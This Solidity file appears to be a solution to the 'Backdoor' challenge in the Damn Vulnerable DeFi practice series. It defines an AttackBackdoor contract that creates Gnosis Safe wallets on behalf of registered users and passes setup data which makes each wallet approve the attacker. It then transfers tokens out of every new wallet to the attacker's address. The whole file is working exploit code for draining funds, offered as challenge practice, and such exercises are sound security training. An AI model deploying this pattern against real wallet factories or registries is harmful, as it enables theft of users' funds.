import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../DamnValuableToken.sol";

contract AttackBackdoor {
    address owner;
    address token;
    address factory;
    address masterCopy;
    address walletRegistry;

    constructor(
        address _owner,
        address _token,
        address _factory,
        address _masterCopy,
        address _walletRegistry
    ) {
        owner = _owner;
        token = _token;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
    }

    function setupToken(address _tokenAddress, address _attacker) external {
        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
    }

    function attack(address[] memory users, bytes memory setupData) public {
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;
            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory initGnosis = abi.encodeWithSignature(
                signatureString,
                victim,
                uint256(1),
                address(this),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    initGnosis,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            DamnValuableToken(token).transferFrom(
                address(newProxy),
                owner,
                10 ether
            );
        }
    }

    receive() external payable {}
}
